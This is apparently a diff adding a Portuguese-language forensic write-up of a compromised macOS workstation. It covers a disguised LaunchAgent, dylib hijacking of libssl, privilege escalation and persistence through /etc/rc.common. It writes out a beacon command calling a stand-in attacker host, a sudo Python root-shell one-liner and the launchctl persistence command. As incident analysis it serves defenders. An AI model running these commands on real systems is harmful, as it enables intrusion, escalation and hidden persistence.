@@ -1,0 +1,7 @@
+Durante a análise de uma estação macOS comprometida, foi identificado que o atacante utilizou o comando launchctl load ~/Library/LaunchAgents/com.apple.update.plist, configurando um agente de inicialização que executava o binário /Users/admin/.local/update_helper.
+
+O binário foi construído explorando a técnica de Dylib Hijacking, substituindo uma biblioteca esperada (libssl.dylib) por uma versão modificada que executava curl http://attacker.site/beacon.
+O sistema permitia gravação em diretórios de bibliotecas devido a File System Permissions Weakness.
+
+Para escalada, o invasor utilizou sudo -u root /usr/bin/python3 -c "import os; os.system('/bin/bash')" após interceptar credenciais de cache.
+A persistência foi reforçada modificando novamente o Launchctl e adicionando a execução automática em /etc/rc.common.
